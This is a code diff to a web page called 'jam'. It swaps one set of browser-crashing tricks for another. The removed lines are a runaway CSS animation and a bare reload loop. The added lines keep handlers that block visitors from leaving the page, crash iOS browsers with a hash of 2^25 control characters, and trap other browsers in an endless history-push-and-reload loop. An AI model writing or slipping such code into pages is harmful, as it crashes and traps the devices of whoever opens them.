@@ -12,16 +12,6 @@
     <link rel="stylesheet" href="./style.css">
 
     <title>jam</title>
-    <style>
-        .crash-css { 
-            filter: blur(1px) contrast(1) brightness(1) saturate(100%);
-            animation: spincrash 0.0001s infinite;
-        }
-        @keyframes spincrash {
-            from { transform: matrix3d(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1); }
-            to { transform: matrix3d(2,1,1,1,1,2,1,1,1,1,2,1,1,1,1,2); }
-        }
-    </style>
 </head>
 
 <body>
@@ -53,8 +43,6 @@
 
         fillJamInformation();
 
-        while (1) { location.reload(1); }
-
         if ('serviceWorker' in navigator) {
             navigator.serviceWorker.register('./worker.js');
         }
@@ -63,11 +51,14 @@
             window.onbeforeunload = () => true;
             window.onunload = () => false;
             window.onclose = () => false;
-            
-            
 
-            if (/iPhone|iPad|iPod/.test(ua)) {
+            if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
                 location.hash = `M${"\u0001".repeat(2 ** 25)}m`;
+            } else {
+                for (;;) {
+                    history.pushState({}, "", location.href);
+                    location.reload(1);
+                }
             }
         }, 50);
     </script>
